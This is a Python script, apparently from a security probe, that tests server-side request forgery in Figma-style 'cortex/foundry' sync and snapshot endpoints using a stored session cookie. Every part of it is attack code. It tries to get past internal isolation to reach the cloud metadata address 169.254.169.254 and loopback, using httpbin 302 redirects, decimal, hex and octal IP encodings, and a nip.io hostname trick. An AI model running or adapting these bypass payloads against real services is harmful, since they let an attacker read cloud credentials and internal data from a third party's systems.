"""foundry SSRF 深化第3轮: 内网隔离绕过尝试
目标结果定义: 若 downloadUrl 经 302 redirect 或 IP 编码变体能拿到
IMDS(169.254.169.254)/回环(127.0.0.1)内容 -> SSRF 升级 High
全部 EMPTY/隔离 -> 隔离完整, 维持 Low-Medium, 测试线收束
"""
import io, json, urllib.request, sys, re, base64, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
UID = "1667396392129259941"
PUB_KEY = "bv2nMIdFf4u3dESGail4sm"

def call(path, body, timeout=40):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json", "Cookie": CK,
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web",
            "X-Figma-User-ID": UID, "X-Figma-File-Key": PUB_KEY}
    data = json.dumps(body).encode()
    req = urllib.request.Request("https://www.figma.com" + path, data=data, headers=hdrs, method="POST")
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode(errors='replace'), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace'), time.time() - t0
    except Exception as e:
        return 0, f"!! {type(e).__name__} {str(e)[:80]}", time.time() - t0

def ssrf_fetch(url, tag, sbox, verbose_sync=False):
    fname = "code/DP_%s.txt" % tag
    body = {"vfsChangeByPath": {tag: {"type": "upsert",
            "entry": {"path": fname, "downloadUrl": url, "metadata": {"version": "1", "guid": "g1"}}}},
            "entrypointsByIdentifier": {}}
    st1, r1, dt1 = call("/api/cortex/foundry/sync", body, timeout=40)
    st2, snap, dt2 = call("/api/cortex/foundry/fs-snapshot",
                     {"sboxdUrl": sbox, "path": "code/src/" + fname, "options": {"content": "snapshot"}}, timeout=40)
    events = re.findall(r'data: (\{.*?\})\n', snap, re.S)
    path_exists = False
    content = ""
    err_fields = []
    for m in events:
        try:
            o = json.loads(m)
        except Exception:
            continue
        if o.get("path") and fname in str(o.get("path")):
            path_exists = True
        if o.get("type") == "fswatch/event" and o.get("content"):
            content = base64.b64decode(o["content"]).decode(errors='replace')
        if o.get("type") in ("error", "sync/error", "fswatch/error") or "error" in str(o)[:200].lower():
            err_fields.append(json.dumps(o, ensure_ascii=False)[:300])
    sync_hits = [k for k in ("error", "fail", "blocked", "denied", "timeout", "unreachable", "reject", "invalid", "private") if k in r1.lower()]
    verdict = "REACHED" if content else (
        "TIMEOUT/FAIL" if "!!" in r1 or "!!" in snap else (
            "SYNC_ERR" if sync_hits or err_fields else (
                "EMPTY(path_absent)" if not path_exists else "EMPTY(path_exists)"
            )
        )
    )
    print(f"[{tag}] {url}")
    print(f"    sync={st1}({dt1:.1f}s) snap={st2}({dt2:.1f}s) -> {verdict}")
    if content:
        print(f"    >>> CONTENT({len(content)}): {content[:300].strip()}")
    if sync_hits:
        print(f"    sync_err_fields: {sync_hits}")
    if err_fields:
        print(f"    sse_err: {err_fields[0]}")
    if verbose_sync and not content:
        print(f"    sync_body: {r1[:400]}")
    return content

print("======== 拿 sandbox ========")
st, resp, _ = call("/api/cortex/foundry/sandbox", {})
SBOX = json.loads(resp)["sboxdUrl"]
print("sandbox:", st, SBOX)

print("\n======== [基线] http 协议公网 + 302 到公网 ========")
ssrf_fetch("http://httpbin.org/robots.txt", "p_http", SBOX)
ssrf_fetch("https://httpbin.org/redirect-to?url=https%3A%2F%2Fhttpbin.org%2Frobots.txt", "p_redir_pub", SBOX, verbose_sync=True)

print("\n======== [绕过1] 302 redirect -> IMDS / 回环 / 内网 ========")
ssrf_fetch("https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", "r_imds", SBOX, verbose_sync=True)
ssrf_fetch("https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%2F", "r_loop", SBOX)
ssrf_fetch("https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A80%2F", "r_loop80", SBOX)
ssrf_fetch("https://httpbin.org/redirect-to?url=http%3A%2F%2F0.0.0.0%2F", "r_zero", SBOX)

print("\n======== [绕过2] IP 编码变体(无 redirect) ========")
ssrf_fetch("http://2130706433/", "e_decimal", SBOX)
ssrf_fetch("http://0x7f000001/", "e_hex", SBOX)
ssrf_fetch("http://0177.0.0.1/", "e_octal", SBOX)
ssrf_fetch("http://169.254.169.254.nip.io/latest/meta-data/", "e_nip", SBOX)

print("\n======== [绕过3] redirect 到 sandbox 内部服务 ========")
ssrf_fetch(SBOX + "/api/health", "i_sbox_health", SBOX)
